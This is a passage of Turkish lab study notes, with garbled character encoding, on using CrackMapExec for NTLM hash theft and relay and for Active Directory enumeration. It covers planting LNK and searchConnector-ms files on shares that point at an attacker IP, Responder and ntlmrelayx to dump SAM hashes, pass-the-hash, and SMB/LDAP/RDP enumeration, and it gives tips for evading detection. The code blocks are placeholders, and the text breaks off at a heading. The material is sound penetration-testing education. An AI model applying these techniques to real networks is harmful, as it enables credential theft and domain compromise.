Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

